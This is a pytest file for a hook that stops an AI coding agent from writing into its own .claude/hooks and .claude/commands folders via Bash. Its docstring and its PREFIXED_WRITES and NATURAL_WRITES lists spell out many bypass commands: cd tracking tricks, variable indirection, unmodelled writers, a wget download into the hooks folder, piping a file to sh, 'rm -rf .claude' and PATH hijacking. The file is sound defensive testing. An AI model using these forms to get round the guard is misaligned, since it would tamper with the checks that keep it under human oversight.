"""hooks/pretool-claude-config-guard.py lets a Bash command the base refuses through only on proof (OB-L31 round 3).

The base refuses a Bash command when a cp, mv, tee or redirect word comes anywhere before a
`.claude/hooks/` or `.claude/commands/` path in its text. The earlier OB-L31 change let such a command
through whenever the simple commands NAMING a protected folder were settled, so a `cp a b` in front of
a real write the parser does not model made the whole command pass: a `cd` into the folder followed by
an unmodelled writer (a script, tar x, patch, make, wget, unzip, sort -o, split, vim -es, git stash
pop), partly modelled commands (find -exec rm, sort -o and --outp, tar -cf and --dir=/--one-top-level=,
zip, sed --i/--in-pl, perl -I dir -i, perl -e with the folder as an argument, sudo -D), cd tracking gaps
(a function body, `OLDPWD=... cd -`, `HOME=... cd`, `. <(echo cd ...)`, `"$PWD"`, `$(pwd)`) and
indirection (`d=...; touch $d`, arrays, `"$_"`, `!$`, `xargs -a`).

Now such a command goes through only when the guard proves the WHOLE command harmless: every simple
command is a reader with no write or exec option or a write verb whose every target is read, no
assignment but locale-like ones, no function, substitution, `source` or unknown wrapper, every `cd`
followed from the session's directory, and every written path literal and outside the protected
folders (a removal, move or recursive copy: no ancestor of one either). Otherwise the base reading
decides. The writes the base misses stay refused, and some natural forms that both readings passed
(find -exec rm, sort -o, sed --i, tar into the folder, a cd followed by tar x / patch / unzip / wget)
are now read as writes too.

Each case runs the real hook as a subprocess, with a scratch HOME and CLAUDE_HOME.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[2]
HOOK = ROOT / "hooks" / "pretool-claude-config-guard.py"
BLOCK = "BLOCKED: claude config guard: agent Bash write to .claude/"
ACTORS = {"main": None, "subagent": ("a0123456789abcdef", "dev")}


@pytest.fixture(scope="module")
def scratch(tmp_path_factory):
    root = tmp_path_factory.mktemp("config-guard-proof")
    home, project = root / "home", root / "proj"
    (home / ".claude" / "commands").mkdir(parents=True)
    (home / ".claude" / "hooks").mkdir()
    (project / ".claude" / "commands").mkdir(parents=True)
    (project / ".claude" / "hooks").mkdir()
    (project / "docs").mkdir()
    return home, project


def _run(scratch, command: str, actor=None, cwd=None):
    home, project = scratch
    cwd = str(cwd or project)
    payload = {"session_id": "sess-proof", "transcript_path": str(project / "t.jsonl"),
               "cwd": cwd, "hook_event_name": "PreToolUse", "tool_name": "Bash",
               "tool_input": {"command": command}}
    if actor:
        payload.update(agent_id=actor[0], agent_type=actor[1])
    env = {k: v for k, v in os.environ.items() if not k.startswith(("CLAUDE", "GIT_")) and k != "CDPATH"}
    env.update(HOME=str(home), CLAUDE_HOME=str(home / ".claude"), CLAUDE_PROJECT_DIR=str(project),
               PYTHONDONTWRITEBYTECODE="1")
    return subprocess.run([sys.executable, str(HOOK)], input=json.dumps(payload), capture_output=True,
                          text=True, cwd=cwd, env=env, timeout=30)


# A read the base reading refuses (a cp word before `.claude/hooks/`) put in front of a real write.
TRIGGER = "cp .claude/hooks/x.py /tmp/x.bak; "

# Real writes into a protected folder that the earlier change passed behind the trigger.
PREFIXED_WRITES = [
    # (A) a cd into the folder, then a writer the parser does not model
    "cd .claude/hooks/ && python3 /tmp/regen.py",
    "cd .claude/hooks/ && tar xf /tmp/w/h.tar",
    "cd .claude/hooks/ && patch -p0 < /tmp/q",
    "cd .claude/hooks/; make",
    "cd .claude/hooks/; npm install",
    "cd .claude/hooks/; wget http://example.invalid/x.py",
    "cd .claude/hooks/; unzip /tmp/y.zip",
    "cd .claude/hooks/; sort -o x /tmp/y",
    "cd .claude/hooks/; split /tmp/y",
    "cd .claude/hooks/; vim -es -c wq x.py",
    "cd .claude/hooks/; git stash pop",
    "cd .claude/hooks/; ./x.py",
    "cd .claude/hooks/; /tmp/w.sh",
    "cd .claude/hooks/; python3 -c 'open(\"x.py\",\"w\")'",
    "cd .claude/hooks/; file -C -m /tmp/m",
    # (B) partly modelled commands
    "find .claude/hooks/ -name '*.pyc' -exec rm {} +",
    "find .claude/hooks/ -name '*.bak' -execdir rm {} \\;",
    "find .claude/hooks/ -ok rm {} \\;",
    "find . -path ./.claude/hooks/x -exec touch {} \\;",
    "sort -o .claude/hooks/list.txt /tmp/y",
    "sort --output=.claude/hooks/x /tmp/y",
    "sort --outp=.claude/hooks/x /tmp/y",
    "tar -cf .claude/hooks/x.tar /tmp/y",
    "tar cf .claude/hooks/x.tar /tmp/y",
    "tar -x -f /tmp/w/h.tar --dir=.claude/hooks/",
    "tar -xf /tmp/y.tar --one-top-level=.claude/hooks/",
    "zip .claude/hooks/x.zip /tmp/y",
    "sed --i s/a/b/ .claude/hooks/x.py",
    "sed --in-pl s/a/b/ .claude/hooks/x.py",
    "perl -I /tmp -i -pe s/a/b/ .claude/hooks/x.py",
    "perl -e 'open F, \">\", shift; print F 1' .claude/hooks/x.py",
    "perl /tmp/w.pl .claude/hooks/x.py",
    "rg --pre /tmp/w.sh x .claude/hooks/",
    "rg --pre=/tmp/w.sh x .claude/hooks/",
    "sudo -D .claude/hooks/ touch x.py",
    "cat .claude/hooks/x.py | sh",
    "git diff --outp=.claude/hooks/x HEAD",
    "git diff --ext-dif HEAD -- .claude/hooks/",
    "git -C .claude/hooks/ grep --open-files-in=vi x",
    "git --git-dir=.git --work-tree=.claude/hooks/ status",
    "git add --chmod=+x .claude/hooks/x.py",
    "gh pr checkout 1 && ls .claude/hooks/",
    # (C) cd tracking gaps
    "f(){ cd .claude/hooks/; }; f; cp /tmp/evil x.py",
    "OLDPWD=.claude/hooks/ cd -; cp /tmp/evil x.py",
    "HOME=$PWD/.claude/hooks/ cd; cp /tmp/evil x.py",
    ". <(echo cd .claude/hooks/); cp /tmp/evil x.py",
    "source /dev/stdin <<< 'cd .claude/hooks/'; cp /tmp/evil x.py",
    "cd .claude/hooks/; cp /tmp/evil \"$PWD\"",
    "cd .claude/hooks/; cp /tmp/evil $(pwd)/x.py",
    "cd .claude/hooks/; pushd /tmp; popd; cp /tmp/evil x.py",
    # (D) indirection
    "d=.claude/hooks/x; touch $d",
    "a=(.claude/hooks/x); touch \"${a[@]}\"",
    "ls .claude/hooks/; cp /tmp/evil \"$_\"",
    "ls .claude/hooks/x; cp /tmp/evil !$",
    "printf '%s\\n' .claude/hooks/x > /tmp/l; xargs -a /tmp/l touch",
    "printf -v d %s .claude/hooks/x; touch \"$d\"",
    # a removal, move or recursive copy reaching the folders from above
    "rm -rf .claude",
    "mv .claude /tmp/old-claude",
    "cp -r /tmp/evil/. .",
    "cp -r /tmp/evil/ .claude",
    "PATH=/tmp/evil:$PATH cp /tmp/x /tmp/y",
]

# Natural forms that both the base and the earlier change passed, now read as writes.
NATURAL_WRITES = [
    "find .claude/hooks/ -name '*.pyc' -exec rm {} +",
    "find .claude/hooks/ -execdir rm {} \\;",
    "sort -o .claude/hooks/list.txt /tmp/y",
    "sort --outp=.claude/hooks/list.txt /tmp/y",
    "sort -no .claude/hooks/list.txt /tmp/y",
    "sed --i s/a/b/ .claude/hooks/x.py",
    "sed --in-pla s/a/b/ .claude/commands/x.md",
    "tar -cf .claude/hooks/x.tar /tmp/y",
    "tar cf .claude/hooks/x.tar /tmp/y",
    "tar --create --file=.claude/hooks/x.tar /tmp/y",
    "tar -x -f /tmp/h.tar --dir=.claude/hooks/",
    "tar -xf /tmp/h.tar --one-top-level=.claude/hooks/x",
    "perl -I /tmp -i -pe s/a/b/ .claude/hooks/x.py",
    "perl -e 'open F, \">\", shift; print F 1' .claude/hooks/x.py",
    "cd .claude/hooks/ && tar xf /tmp/h.tar",
    "cd .claude/hooks/ && patch -p0 < /tmp/q",
    "cd .claude/hooks/ && unzip /tmp/y.zip",
    "cd .claude/hooks/ && wget http://example.invalid/x.py",
]

# Harmless commands the proof must let through (the base reading refuses most of them).
HARMLESS = [
    "cp ~/.claude/hooks/x.py /tmp/x.bak",
    "cp .claude/hooks/x.py /tmp/ && cp /tmp/x.py /tmp/y.py",
    "cp -r .claude/commands/ /tmp/cmds && tee /tmp/l < /dev/null",
    "cp ~/.claude/hooks/x .",
    "cp .claude/hooks/x .claude/hooks.bak/",
    "mv /tmp/a /tmp/b && ls .claude/hooks/",
    "cp a b && ls .claude/hooks/ | sort -n > /tmp/l",
    "cp a b && sed -n 1,20p .claude/hooks/x.py",
    "cp a b && find .claude/hooks/ -name '*.py' > /tmp/f.txt",
    "cp a b && git log --oneline -- .claude/hooks/",
    "cp a b && git -C .claude/hooks log --oneline -5",
    "cp a b && rg -n x .claude/hooks/ > /tmp/r.txt",
    "cp .claude/hooks/x.py /tmp/y.py && sed -i s/a/b/ /tmp/y.py",
    "cp .claude/hooks/x.py /tmp/y.py; cd .claude/hooks && ls; cd /tmp && echo x > y",
    "cp .claude/hooks/x.py /tmp/y.py; (cd .claude/hooks && ls) > /tmp/l",
    "cp .claude/hooks/x.py /tmp/y.py; cd .claude/hooks && grep -n x *.py > /tmp/g.txt",
    "cp .claude/hooks/x.py /tmp/y.py && LC_ALL=C sort /tmp/y.py > /tmp/z",
    "cp .claude/hooks/x.py /tmp/y.py & cd .claude/hooks/ & cp /tmp/x /tmp/z",
    "bash -c 'cp ~/.claude/hooks/a.py /tmp/a.py'",
    "timeout 5 cp ~/.claude/hooks/a.py /tmp/a.py",
    "echo \"cp x .claude/hooks/a\" > /tmp/note.txt",
    "gh pr create --title x --body \"mv .claude/commands/a b\"",
    "git commit -m \"fix cp into .claude/hooks/\"",
    # read-only commands the base passes and the guard must not start refusing
    "find .claude/hooks -name '*.py' -exec grep -l foo {} +",
    "tar -cf /tmp/h.tar .claude/hooks/",
    "tar -czf /tmp/h.tgz -C .claude hooks",
    "tar -tf a.tar -C .claude/hooks",
    "zip -r /tmp/h.zip .claude/hooks/",
    "unzip -l a.zip",
    "sort -n .claude/hooks/list.txt > /tmp/s",
    "perl -ne 'print' .claude/hooks/a.py",
    "cd .claude/hooks && git log --oneline -3 > /tmp/l.txt",
    "cd .claude/hooks; python3 -m pytest -q > /tmp/out.txt",
]


@pytest.mark.parametrize("actor", ACTORS)
@pytest.mark.parametrize("command", PREFIXED_WRITES)
def test_a_write_behind_a_base_trigger_is_refused(scratch, command, actor):
    proc = _run(scratch, TRIGGER + command, ACTORS[actor])
    assert proc.returncode == 2, (command, proc.returncode, proc.stderr)
    assert BLOCK in proc.stderr, proc.stderr


@pytest.mark.parametrize("command", PREFIXED_WRITES)
def test_the_write_is_refused_with_a_trigger_joined_by_and(scratch, command):
    proc = _run(scratch, "cp ~/.claude/hooks/x.py /tmp/x.bak && " + command)
    assert proc.returncode == 2, (command, proc.returncode, proc.stderr)


@pytest.mark.parametrize("actor", ACTORS)
@pytest.mark.parametrize("command", NATURAL_WRITES)
def test_a_natural_write_form_is_refused(scratch, command, actor):
    proc = _run(scratch, command, ACTORS[actor])
    assert proc.returncode == 2, (command, proc.returncode, proc.stderr)
    assert BLOCK in proc.stderr, proc.stderr


@pytest.mark.parametrize("actor", ACTORS)
@pytest.mark.parametrize("command", HARMLESS)
def test_a_proven_harmless_command_goes_through(scratch, command, actor):
    proc = _run(scratch, command, ACTORS[actor])
    assert proc.returncode == 0, (command, proc.stderr)


def test_a_relative_write_is_read_from_the_session_directory(scratch):
    """Run from <project>/.claude, `hooks/x.py` is the protected folder: the proof resolves a relative
    target from the session's own directory, not from the project root."""
    claude_dir = scratch[1] / ".claude"
    assert _run(scratch, TRIGGER + "cp /tmp/evil hooks/x.py", cwd=claude_dir).returncode == 2
    assert _run(scratch, TRIGGER + "cd hooks; cp /tmp/evil x.py", cwd=claude_dir).returncode == 2
    assert _run(scratch, "cp .claude/hooks/x /tmp/y && cp /tmp/y /tmp/z", cwd=claude_dir).returncode == 0
